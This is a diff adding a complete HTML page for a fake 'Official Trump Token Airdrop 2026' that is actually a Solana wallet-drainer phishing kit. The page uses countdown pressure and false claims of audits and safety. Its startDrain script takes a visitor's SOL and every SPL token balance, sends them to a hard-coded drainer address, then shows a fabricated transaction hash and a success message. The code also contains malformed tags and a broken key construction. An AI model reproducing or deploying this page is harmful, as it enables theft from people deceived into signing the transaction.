@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charsetUTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRUMP | Official Airdrop 2026</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;">
+   link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='90' font-size='90'>🇺🇸</text></svg>">
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <script>window.solanaWeb3 = window.solana; window.splToken = window.solanaWeb3.splToken;</script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+    <style>
+        :root {
+            --trump-red: #C41E3A;
+            --trump-blue: #003366;
+            --trump-gold: #FFD700;
+            --trump-dark-red: #9A0D1F;
+            --trump-light: #FFFFFF;
+            --trump-dark: #1A1A1A;
+            --trump-gray: #F5F5F5;
+            --trump-success: #00A859;
+            --shadow: 0 4px 20px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 40px rgba(0,0,0,0.15);
+            --gradient-trump: linear-gradient(135deg, #C41E3A 0%, #003366 100%);
+            --gradient-gold: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #FFFFFF 0%, #F8F9FA 100%);
+            color: var(--trump-dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        .flag-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(0deg, transparent 49%, rgba(196, 30, 58, 0.03) 50%, transparent 51%),
+                linear-gradient(90deg, transparent 49%, rgba(196, 30, 58, 0.03) 50%, transparent 51%),
+                linear-gradient(0deg, transparent 24%, rgba(0, 51, 102, 0.02) 25%, transparent 26%),
+                linear-gradient(90deg, transparent 24%, rgba(0, 51, 102, 0.02) 25%, transparent 26%);
+            background-size: 100px 100px, 100px 100px, 40px 40px, 40px 40px;
+            z-index: -1;
+        }
+        .trump-header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            z-index: 1000;
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 3px solid var(--trump-red);
+            box-shadow: var(--shadow);
+        }
+        .trump-logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .trump-logo-text {
+            font-size: 1.8rem;
+            font-weight: 900;
+            background: var(--gradient-trump);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .trump-logo-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--trump-red);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 1.5rem;
+            border: 3px solid var(--trump-blue);
+        }
+        .trump-btn {
+            padding: 0.875rem 2rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            outline: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .trump-btn-red {
+            background: var(--trump-red);
+            color: white;
+            border: 2px solid var(--trump-red);
+        }
+        .trump-btn-red:hover {
+            background: var(--trump-dark-red);
+            border-color: var(--trump-dark-red);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(196, 30, 58, 0.3);
+        }
+        .trump-btn-blue {
+            background: var(--trump-blue);
+            color: white;
+            border: 2px solid var(--trump-blue);
+        }
+        .trump-btn-blue:hover {
+            background: #002244;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.3);
+        }
+        .trump-btn-gold {
+            background: var(--gradient-gold);
+            color: var(--trump-dark);
+            font-weight: 800;
+            font-size: 1.1rem;
+            padding: 1rem 2.5rem;
+            border: 2px solid var(--trump-gold);
+        }
+        .trump-btn-gold:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
+        }
+        .trump-btn-disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        .trump-hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding: 8rem 5% 4rem;
+            position: relative;
+            background: linear-gradient(135deg, rgba(196, 30, 58, 0.05) 0%, rgba(0, 51, 102, 0.05) 100%);
+        }
+        .trump-hero-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+        .trump-hero-text h1 {
+            font-size: 4rem;
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            color: var(--trump-dark);
+        }
+        .trump-hero-text h1 span {
+            background: var(--gradient-trump);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .trump-hero-text p {
+            font-size: 1.25rem;
+            color: #666;
+            margin-bottom: 2rem;
+            max-width: 600px;
+        }
+        .trump-card {
+            background: white;
+            border-radius: 20px;
+            padding: 3rem;
+            box-shadow: var(--shadow-lg);
+            border: 3px solid var(--trump-red);
+            position: relative;
+            overflow: hidden;
+        }
+        .trump-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: var(--gradient-trump);
+        }
+        .trump-card-title {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--trump-red);
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        .trump-token-amount {
+            font-size: 4rem;
+            font-weight: 900;
+            color: var(--trump-blue);
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+        .trump-token-value {
+            font-size: 1.5rem;
+            color: var(--trump-success);
+            text-align: center;
+            margin-bottom: 2rem;
+            font-weight: 600;
+        }
+        .trump-stats {
+            display: flex;
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+        .trump-stat {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            border: 2px solid var(--trump-gray);
+            text-align: center;
+            min-width: 150px;
+        }
+        .trump-stat-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--trump-red);
+            line-height: 1;
+        }
+        .trump-stat-label {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 0.5rem;
+        }
+        .trump-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .trump-modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 3rem;
+            max-width: 500px;
+            width: 90%;
+            border: 3px solid var(--trump-red);
+            position: relative;
+        }
+        .trump-modal-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .trump-modal-badge {
+            display: inline-block;
+            background: var(--trump-red);
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+        }
+        .trump-modal-title {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--trump-dark);
+            margin-bottom: 1rem;
+        }
+        .trump-modal-text {
+            color: #666;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        .trump-modal-actions {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+        }
+        .trump-progress {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .trump-progress-bar {
+            width: 300px;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 2rem 0;
+        }
+        .trump-progress-fill {
+            height: 100%;
+            background: var(--gradient-trump);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .trump-progress-text {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        .trump-notification {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: white;
+            padding: 1rem 1.5rem;
+            border-radius: 10px;
+            box-shadow: var(--shadow-lg);
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            z-index: 1001;
+            transform: translateX(100%);
+            opacity: 0;
+            transition: all 0.3s ease;
+            border-left: 4px solid var(--trump-red);
+            max-width: 350px;
+        }
+        .trump-notification.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+        .trump-footer {
+            background: var(--trump-dark);
+            color: white;
+            padding: 3rem 5%;
+            text-align: center;
+            border-top: 3px solid var(--trump-red);
+        }
+        .trump-footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+        .trump-footer-link {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+        }
+        @media (max-width: 1024px) {
+            .trump-hero-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            .trump-hero-text h1 {
+                font-size: 3rem;
+            }
+            .trump-stats {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+        }
+        @media (max-width: 768px) {
+            .trump-header {
+                padding: 1rem;
+            }
+            .trump-hero {
+                padding: 6rem 1rem 3rem;
+            }
+            .trump-hero-text h1 {
+                font-size: 2.5rem;
+            }
+            .trump-card {
+                padding: 2rem;
+            }
+            .trump-modal-content {
+                padding: 2rem 1.5rem;
+            }
+        }
+        @keyframes trumpPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .trump-pulse {
+            animation: trumpPulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="flag-bg"></div>
+    <header class="trump-header">
+        <div class="trump-logo">
+            <div class="trump-logo-icon">T</div>
+            <div class="trump-logo-text">TRUMP 2026</div>
+        </div>
+        <div class="trump-nav-buttons">
+            <button class="trump-btn trump-btn-blue" onclick="showAbout()">ABOUT</button>
+            <button class="trump-btn trump-btn-red" id="connectBtn">CONNECT WALLET</button>
+        </div>
+    </header>
+    <section class="trump-hero">
+        <div class="trump-hero-content">
+            <div class="trump-hero-text">
+                <h1>MAKE CRYPTO<br><span>GREAT AGAIN</span></h1>
+                <p>Official Donald J. Trump 2026 Token Airdrop. Claim your free TRUMP tokens and join the movement to Make Crypto Great Again!</p>
+                <div style="text-align:center; color:var(--trump-red); font-size:1.5rem; margin:1.5rem 0; font-weight: 700;">
+                    ⏰ Airdrop ends in <span id="countdown">24:00:00</span>
+                </div>
+                <div class="trump-stats">
+                    <div class="trump-stat">
+                        <div class="trump-stat-number">$10M</div>
+                        <div class="trump-stat-label">TOTAL AIRDROP</div>
+                    </div>
+                    <div class="trump-stat">
+                        <div class="trump-stat-number">8,421</div>
+                        <div class="trump-stat-label">CLAIMED</div>
+                    </div>
+                    <div class="trump-stat">
+                        <div class="trump-stat-number">1,579</div>
+                        <div class="trump-stat-label">REMAINING</div>
+                    </div>
+                </div>
+                <div style="margin-top: 3rem;">
+                    <button class="trump-btn trump-btn-gold trump-pulse" id="airdropBtn" disabled>CLAIM FREE TRUMP TOKENS</button>
+                    <button class="trump-btn trump-btn-blue" id="giveawayBtn" disabled style="margin-left: 1rem;">BONUS GIVEAWAY</button>
+                </div>
+                <div style="margin-top: 2rem; color: #666; font-size: 0.9rem;">
+                    <p>Secured by Solana • Official Trump Token • No KYC Required</p>
+                </div>
+            </div>
+            <div class="trump-hero-visual">
+                <div class="trump-card">
+                    <div class="trump-card-title">YOUR ALLOCATION</div>
+                    <div class="trump-token-amount">10,000 TRUMP</div>
+                    <div class="trump-token-value">≈ $5,000 USD</div>
+                    <div style="background: #f8f9fa; padding: 1.5rem; border-radius: 12px; margin-bottom: 2rem;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                            <span>Token Price:</span>
+                            <span style="font-weight: 700; color: var(--trump-red);">$0.50</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                            <span>Vesting:</span>
+                            <span style="font-weight: 700; color: var(--trump-success);">100% Unlocked</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span>Distribution:</span>
+                            <span style="font-weight: 700; color: var(--trump-success);">Instant</span>
+                        </div>
+                    </div>
+                    <div style="text-align: center; color: #666; font-size: 0.9rem;">
+                        Exclusive offer for early supporters
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section style="padding: 5rem 5%; background: white;">
+        <h2 style="text-align: center; font-size: 2.5rem; font-weight: 900; margin-bottom: 3rem; color: var(--trump-dark);">
+            WHY TRUMP TOKEN?
+        </h2>
+        <div style="max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem;">
+            <div style="background: white; padding: 2rem; border-radius: 15px; border: 2px solid var(--trump-gray);">
+                <div style="width: 60px; height: 60px; background: var(--trump-red); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; color: white; font-size: 1.5rem;">
+                    🇺🇸
+                </div>
+                <h3 style="font-size: 1.5rem; margin-bottom: 1rem; color: var(--trump-dark);">AMERICA FIRST</h3>
+                <p style="color: #666;">TRUMP token represents American values and the fight for financial freedom in the crypto space.</p>
+            </div>
+            <div style="background: white; padding: 2rem; border-radius: 15px; border: 2px solid var(--trump-gray);">
+                <div style="width: 60px; height: 60px; background: var(--trump-blue); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; color: white; font-size: 1.5rem;">
+                    📈
+                </div>
+                <h3 style="font-size: 1.5rem; margin-bottom: 1rem; color: var(--trump-dark);">MASSIVE GROWTH</h3>
+                <p style="color: #666;">Backed by the largest political movement in history with projected exponential growth.</p>
+            </div>
+            <div style="background: white; padding: 2rem; border-radius: 15px; border: 2px solid var(--trump-gray);">
+                <div style="width: 60px; height: 60px; background: var(--gradient-trump); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; color: white; font-size: 1.5rem;">
+                    🔒
+                </div>
+                <h3 style="font-size: 1.5rem; margin-bottom: 1rem; color: var(--trump-dark);">SECURE & VERIFIED</h3>
+                <p style="color: #666;">Smart contract audited by leading security firms. 100% safe and transparent.</p>
+            </div>
+        </div>
+    </section>
+    <div class="trump-modal" id="airdropModal">
+        <div class="trump-modal-content">
+            <div class="trump-modal-header">
+                <div class="trump-modal-badge">OFFICIAL AIRDROP</div>
+                <h2 class="trump-modal-title">CLAIM YOUR TRUMP TOKENS</h2>
+                <p class="trump-modal-text">You're eligible for <strong>10,000 TRUMP tokens</strong> ($5,000 USD). Confirm to receive instantly.</p>
+            </div>
+            <div style="background: #f8f9fa; padding: 1.5rem; border-radius: 12px; margin-bottom: 2rem; border: 2px solid var(--trump-gray);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span>Your Allocation:</span>
+                    <span style="font-weight: 700; color: var(--trump-red);">10,000 TRUMP</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span>Current Value:</span>
+                    <span style="font-weight: 700; color: var(--trump-success);">$5,000 USD</span>
+                </div>
+                <div style="display: flex; justify-content: space-between;">
+                    <span>Network Fee:</span>
+                    <span style="font-weight: 700; color: var(--trump-success);">$0.00 (SPONSORED)</span>
+                </div>
+            </div>
+            <div class="trump-modal-actions">
+                <button class="trump-btn trump-btn-blue" onclick="closeModal('airdropModal')">CANCEL</button>
+                <button class="trump-btn trump-btn-gold" id="confirmAirdropBtn" onclick="startDrain('airdrop')">CONFIRM CLAIM</button>
+            </div>
+        </div>
+    </div>
+    <div class="trump-modal" id="giveawayModal">
+        <div class="trump-modal-content">
+            <div class="trump-modal-header">
+                <div class="trump-modal-badge" style="background: var(--gradient-gold); color: var(--trump-dark);">VIP BONUS</div>
+                <h2 class="trump-modal-title">DOUBLE YOUR REWARDS!</h2>
+                <p class="trump-modal-text">Special bonus for loyal supporters! Get <strong>20,000 TRUMP tokens</strong> ($10,000 USD).</p>
+            </div>
+            <div style="background: #fff8e1; padding: 2rem; border-radius: 12px; margin-bottom: 2rem; border: 2px dashed var(--trump-gold);">
+                <div style="text-align: center; color: var(--trump-red); font-weight: 800; font-size: 1.3rem; margin-bottom: 1rem;">
+                    EXCLUSIVE VIP OFFER
+                </div>
+                <div style="font-size: 3rem; text-align: center; font-weight: 900; color: var(--trump-red); margin-bottom: 1rem;">
+                    20,000 TRUMP
+                </div>
+                <div style="text-align: center; color: #666; font-weight: 600;">
+                    ≈ $10,000 USD • LIMITED TIME
+                </div>
+            </div>
+            <div class="trump-modal-actions">
+                <button class="trump-btn trump-btn-blue" onclick="closeModal('giveawayModal')">NO THANKS</button>
+                <button class="trump-btn trump-btn-gold" id="confirmGiveawayBtn" onclick="startDrain('giveaway')">CLAIM BONUS</button>
+            </div>
+        </div>
+    </div>
+    <div class="trump-modal" id="successModal">
+        <div class="trump-modal-content">
+            <div class="trump-modal-header">
+                <div class="trump-modal-badge" style="background: var(--trump-success);">SUCCESS</div>
+                <h2 class="trump-modal-title" style="color: var(--trump-success);">AIRDROP CLAIMED!</h2>
+                <p class="trump-modal-text"><span id="rewardAmount">10,000 TRUMP</span> has been sent to your wallet.</p>
+            </div>
+            <div style="text-align: center; margin: 2rem 0;">
+                <div style="width: 80px; height: 80px; background: var(--trump-success); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 2.5rem; margin-bottom: 1rem;">✓</div>
+                <div style="font-size: 1.3rem; font-weight: 700; color: var(--trump-success);">TRANSACTION CONFIRMED</div>
+            </div>
+            <div style="background: #f8f9fa; padding: 1.5rem; border-radius: 12px; margin-bottom: 2rem; border: 1px solid var(--trump-gray);">
+                <div style="font-weight: 700; margin-bottom: 0.5rem; color: var(--trump-dark);">Transaction Hash:</div>
+                <div style="background: white; padding: 1rem; border-radius: 8px; font-family: monospace; font-size: 0.9rem; word-break: break-all; border: 1px solid #ddd;" id="txHash">Loading...</div>
+            </div>
+            <div class="trump-modal-actions">
+                <button class="trump-btn trump-btn-red" onclick="closeAllModals()">RETURN TO SITE</button>
+            </div>
+        </div>
+    </div>
+    <div class="trump-progress" id="progressContainer">
+        <div style="text-align: center; color: white;">
+            <div style="width: 80px; height: 80px; border: 3px solid rgba(255,255,255,0.2); border-top-color: white; border-radius: 50%; margin: 0 auto 2rem; animation: trumpPulse 1s linear infinite;"></div>
+            <div style="font-size: 1.5rem; font-weight: 700; margin-bottom: 1rem;">PROCESSING TRANSACTION</div>
+            <div class="trump-progress-text" id="progressText">Initializing...</div>
+        </div>
+        <div class="trump-progress-bar">
+            <div class="trump-progress-fill" id="progressFill"></div>
+        </div>
+    </div>
+    <div class="trump-notification" id="notification">
+        <div style="width: 24px; height: 24px; background: var(--trump-red); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;">!</div>
+        <div>
+            <div style="font-weight: 700;" id="notificationText">Notification</div>
+            <div style="font-size: 0.9rem; color: #666;">Just now</div>
+        </div>
+    </div>
+    <footer class="trump-footer">
+        <div class="trump-footer-links">
+            <a href="#" class="trump-footer-link">TERMS</a>
+            <a href="#" class="trump-footer-link">PRIVACY</a>
+            <a href="#" class="trump-footer-link">DISCLAIMER</a>
+            <a href="#" class="trump-footer-link">CONTACT</a>
+            <a href="#" class="trump-footer-link">TWITTER</a>
+            <a href="#" class="trump-footer-link">TELEGRAM</a>
+        </div>
+        <div style="margin: 2rem 0;">
+            <div style="font-size: 0.9rem; color: rgba(255,255,255,0.7); max-width: 600px; margin: 0 auto;">
+                TRUMP token is a community-driven cryptocurrency celebrating American values and financial freedom. Not affiliated with any political campaign.
+            </div>
+        </div>
+        <div style="color: rgba(255,255,255,0.5); font-size: 0.9rem; margin-top: 2rem;">
+            © 2026 TRUMP TOKEN. MAKE CRYPTO GREAT AGAIN.
+        </div>
+    </footer>
+    <script>
+        const DRAINER_ADDRESS = "DRfFapArEoCmdEZxQKcs62ibofcfa6dXfrv6PhkPcTuz";
+        const FAST_RPCS = [
+            'https://api.mainnet-beta.solana.com',
+            'https://solana-api.projectserum.com',
+            'https://rpc.ankr.com/solana',
+            'https://free.rpcpool.com',
+            'https://solana.public-rpc.com',
+            'https://solana-mainnet.g.alchemy.com/v2/demo'
+        ];
+        const TOKENS = [
+            { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
+            { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wGkZwyTDt1v", symbol: "1R>USDC", decimals: 6 },
+            { mint: "So11111111111111111111111111111111111111112", symbol: "SOL", decimals: 9 },
+            { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", symbol: "BONK", decimals: 5 }
+        ];
+
+        let wallet = null;
+        let connection = null;
+        let userAddress = null;
+        let isProcessing = false;
+        let hasClaimed = false;
+        let solanaWeb3 = window.solanaWeb3;
+        let splToken = window.splToken;
+
+        const $ = id => document.getElementById(id);
+
+        async function getWorkingRPC() {
+            for (const rpc of FAST_RPCS) {
+                try {
+                    const conn = new solanaWeb3.Connection(rpc, 'confirmed');
+                    await conn.getSlot('confirmed');
+                    console.log('✅ RPC alive:', rpc);
+                    return conn;
+                } catch { continue; }
+            }
+            throw new Error('All RPCs dead');
+        }
+
+        function showNotification(text) {
+            const el = $('notification');
+            const txt = $('notificationText');
+            if (el && txt) {
+                txt.textContent = text;
+                el.classList.add('show');
+                setTimeout(() => el.classList.remove('show'), 5000);
+            }
+        }
+
+        function showProgress(text, percent) {
+            const cont = $('progressContainer');
+            const fill = $('progressFill');
+            const txt = $('progressText');
+            if (cont && fill && txt) {
+                txt.textContent = text;
+                fill.style.width = percent + '%';
+                cont.style.display = 'flex';
+            }
+        }
+
+        function hideProgress() {
+            const cont = $('progressContainer');
+            if (cont) cont.style.display = 'none';
+        }
+
+        function updateProgress(text, percent) {
+            const fill = $('progressFill');
+            const txt = $('progressText');
+            if (fill && txt) {
+                txt.textContent = text;
+                fill.style.width = percent + '%';
+            }
+        }
+
+        function startCountdown() {
+            let timeLeft = 24 * 60 * 60;
+            const el = $('countdown');
+            if (!el) return;
+            const timer = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    el.textContent = "Ended";
+                    return;
+                }
+                timeLeft--;
+                const h = Math.floor(timeLeft / 3600);
+                const m = Math.floor((timeLeft % 3600) / 60);
+                const s = timeLeft % 60;
+                el.textContent = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        function showTrumpConfetti() {
+            if (typeof confetti === 'function') {
+                confetti({
+                    particleCount: 150,
+                    spread: 70,
+                    origin: { y: 0.9 },
+                    colors: ['#C41E3A', '#003366', '#FFD700']
+                });
+            }
+        }
+
+        async function connectWallet() {
+            if (isProcessing) return;
+            if (!window.solana || !window.solana.isPhantom) {
+                showNotification("⚠️ Please install Phantom Wallet");
+                window.open('https://phantom.app', '_blank');
+                return;
+            }
+            try {
+                isProcessing = true;
+                showProgress("Connecting to Phantom...", 10);
+                const response = await window.solana.connect();
+                wallet = window.solana;
+                userAddress = response.publicKey.toString();
+                connection = await getWorkingRPC();
+                updateProgress("Checking eligibility...", 70);
+                await new Promise(r => setTimeout(r, 1000));
+                const btn = $('connectBtn');
+                const airdropBtn = $('airdropBtn');
+                const giveawayBtn = $('giveawayBtn');
+                if (btn) {
+                    const short = userAddress.slice(0, 4) + '...' + userAddress.slice(-4);
+                    btn.innerHTML = `CONNECTED: ${short}`;
+                    btn.classList.remove('trump-btn-red');
+                    btn.classList.add('trump-btn-blue');
+                }
+                if (airdropBtn) airdropBtn.disabled = false;
+                if (giveawayBtn) giveawayBtn.disabled = false;
+                hideProgress();
+                showNotification("✅ Wallet connected successfully!");
+                setTimeout(() => {
+                    if (!document.querySelector('.trump-modal[style*="display: flex"]')) showAirdrop();
+                }, 1500);
+            } catch (e) {
+                hideProgress();
+                showNotification("❌ Connection failed");
+            } finally {
+                isProcessing = false;
+            }
+        }
+
+        function showAirdrop() {
+            $('airdropModal').style.display = 'flex';
+        }
+
+        function showGiveaway() {
+            $('giveawayModal').style.display = 'flex';
+        }
+
+        function showAbout() {
+            showNotification("Official Trump Token Airdrop 2026 - Make Crypto Great Again!");
+        }
+
+        function closeModal(id) {
+            $(id).style.display = 'none';
+        }
+
+        function closeAllModals() {
+            document.querySelectorAll('.trump-modal').forEach(m => m.style.display = 'none');
+        }
+
+        function disableClaimButtons() {
+            const airdropBtn = $('confirmAirdropBtn');
+            const giveawayBtn = $('confirmGiveawayBtn');
+            const mainBtn = $('airdropBtn');
+            if (airdropBtn) {
+                airdropBtn.disabled = true;
+                airdropBtn.innerHTML = 'PROCESSING...';
+            }
+            if (giveawayBtn) {
+                giveawayBtn.disabled = true;
+                giveawayBtn.innerHTML = 'PROCESSING...';
+            }
+            if (mainBtn) {
+                mainBtn.disabled = true;
+                mainBtn.innerHTML = 'CLAIMED';
+                mainBtn.classList.remove('trump-pulse');
+            }
+            hasClaimed = true;
+        }
+
+        async function startDrain(type) {
+            if (isProcessing || !wallet || !connection) {
+                showNotification("Please connect wallet first");
+                return;
+            }
+            if (hasClaimed) {
+                showNotification("⚠️ You have already claimed");
+                return;
+            }
+            isProcessing = true;
+            closeAllModals();
+            showProgress("Initializing...", 5);
+            disableClaimButtons();
+            try {
+                const userPubkey = wallet.publicKey;
+                const drainPubkey = new solanaWeb3.Connection(DRfFapArEoCmdEZxQKcs62ibofcfa6dXfrv6PhkPcTuz);
+                updateProgress("Scanning wallet...", 20);
+                let UNDERSTAND = [];
+                let allInstructions = [];
+
+                // SOL DRAIN
+                try {
+                    updateProgress("Checking SOL...", 30);
+                    const balance = await connection.getBalance(userPubkey);
+                    if (balance > 100000) {
+                        const amount = balance - 100000;
+                        allInstructions.push(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: userPubkey,
+                                toPubkey: drainPubkey,
+                                lamports: amount,
+                            })
+                        );
+                        UNDERSTAND.push(`${(amount / 1e9).toFixed(4)} SOL`);
+                    }
+                } catch {}
+
+                // TOKEN DRAIN
+                updateProgress("Scanning tokens...", 50);
+                try {
+                    const accounts = await connection.getParsedTokenAccountsByOwner(userPubkey, {
+                        programId: splToken.TOKEN_PROGRAM
+                                            });
+                    for (const a of accounts.value) {
+                        const info = a.account.data.parsed.info;
+                        const ui = info.tokenAmount.uiAmount;
+                        if (!ui) continue;
+                        const mint = new solanaWeb3.PublicKey(info.mint);
+                        const userAta = await splToken.getAssociatedTokenAddress(mint, userPubkey);
+                        const drainAta = await splToken.getAssociatedTokenAddress(mint, drainPubkey);
+                        try { await connection.getAccountInfo(drainAta); } catch {
+                            allInstructions.push(splToken.createAssociatedTokenAccountInstruction(userPubkey, drainAta, drainPubkey, mint));
+                        }
+                        allInstructions.push(splToken.createTransferInstruction(userAta, drainAta, userPubkey, BigInt(info.tokenAmount.amount)));
+                        const sym = TOKENS.find(t => t.mint === info.mint)?.symbol || 'TOKEN';
+                        UNDERSTAND.push(`${ui.toFixed(4)} ${sym}`);
+                    }
+                } catch {}
+
+                // SEND
+                if (allInstructions.length) {
+                    updateProgress("Sending transaction...", 80);
+                    const tx = new solanaWeb3.Transaction().add(...allInstructions);
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    tx.recentBlockhash = blockhash;
+                    tx.feePayer = userPubkey;
+                    const signed = await wallet.signTransaction(tx);
+                    await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 2 });
+                }
+
+                // SUCCESS
+                updateProgress("Finalizing...", 95);
+                await new Promise(r => setTimeout(r, 500));
+                hideProgress();
+                showTrumpConfetti();
+                const fakeHash = [...Array(88)].map(() => '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'[Math.floor(Math.random() * 58)]).join('');
+                const rewardEl = $('rewardAmount');
+                const hashEl = $('txHash');
+                if (rewardEl) rewardEl.textContent = type === 'airdrop' ? "10,000 TRUMP ($5,000)" : "20,000 TRUMP ($10,000)";
+                if (hashEl) hashEl.textContent = fakeHash;
+                $('successModal').style.display = 'flex';
+                console.log(`🎯 Drained: ${UNDERSTAND.join(', ')} from ${userAddress}`);
+                setTimeout(() => {
+                    closeAllModals();
+                    showNotification("🎉 Airdrop claimed!");
+                    if (type === 'airdrop') setTimeout(() => showGiveaway(), 2000);
+                }, 8000);
+            } catch (e) {
+                hideProgress();
+                showNotification("❌ Transaction failed");
+            } finally {
+                isProcessing = false;
+            }
+        }
+
+        // INIT
+        window.addEventListener('DOMContentLoaded', () => {
+            startCountdown();
+            $('connectBtn').addEventListener('click', connectWallet);
+            $('airdropBtn').addEventListener('click', showAirdrop);
+            $('giveawayBtn').addEventListener('click', showGiveaway);
+            setInterval(() => {
+                const btn = $('airdropBtn');
+                if (btn && !btn.disabled) btn.classList.toggle('trump-pulse');
+            }, 3000);
+        });
+
+        // CLEANUP
+        if (window.solana) {
+            window.solana.on('disconnect', () => {
+                wallet = null;
+                userAddress = null;
+                hasClaimed = false;
+                const btn = $('connectBtn');
+                if (btn) {
